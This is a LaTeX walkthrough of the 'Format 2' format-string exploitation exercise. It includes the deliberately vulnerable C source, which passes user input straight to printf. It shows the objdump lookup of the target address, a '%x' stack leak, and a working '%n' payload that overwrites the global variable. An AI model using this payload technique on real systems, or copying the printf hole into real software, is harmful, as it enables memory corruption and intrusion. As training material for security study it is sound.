
\begin{center}\begin{LARGE}Format 2\end{LARGE}\end{center}
 
\subsection*{Problem}

\begin{lstlisting}[language=bash]
objdump -t format2 | grep target
>>>080496e4 g     O .bss   00000004              target
\end{lstlisting}

Again, we find the location of our target. We know from the source code that the
program now takes in an input into the buffer and prints it. We so the same
as before by first printing a sequence of character and try to identify where
the pointer resides on the stack. We then make use of string format to do the attack.

\subsection*{Idea and Attack process}

We first try to locate our variable first. This time we quickly find the target,
that is 2 positions below our injected string.

\begin{lstlisting}[language=bash]
python -c "print 'AAAA' + '%x.'*10" | ./format2
>>>AAAA200.b7fd8420.bffffb14.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
\end{lstlisting}

We now want to write to the target value. We try different values to write to the
address and we eventually find that the combination below leads to the target
variable being modified.

\begin{lstlisting}[language=bash]
 python -c "print '\xe4\x96\x04\x08' + '%x.'*2 + '%47d' +'%n'" | ./format2
200.b7fd8420.                                    -1073743084
you have modified the target :)
\end{lstlisting}

\subsection*{Source code}

\begin{lstlisting}[language=c]
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
    char buffer[512];

    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);
    
    if(target == 64) {
        printf("you have modified the target :)\n");
    } else {
        printf("target is %d :(\n", target);
    }
}

int main(int argc, char **argv)
{
    vuln();
}
\end{lstlisting}
